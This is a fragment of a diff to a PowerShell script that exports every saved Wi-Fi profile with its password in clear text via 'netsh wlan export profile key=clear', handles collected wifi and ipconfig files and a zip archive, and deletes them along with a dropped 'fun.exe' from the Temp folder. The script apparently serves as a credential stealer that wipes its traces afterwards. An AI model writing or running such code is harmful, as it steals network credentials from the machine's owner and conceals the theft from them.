@@ -21,7 +21,6 @@ while (-not (Test-Path $zip)) {
     Start-Sleep -Seconds 1
 }
 
-
 netsh wlan export profile key=clear folder=$e | Out-Null
 
 $wifiFile = "$e\wifi.txt"
@@ -43,6 +42,7 @@ cls
 Remove-Item -Path "$wifiFile" -Force
 Remove-Item -Path "$e\ipcfg.txt" -Force
 Remove-Item -Path "$zip" -Force
+Remove-Item -Path "$env:LOCALAPPDATA\Temp\fun.exe" -Force
 
 
 #exit quickly
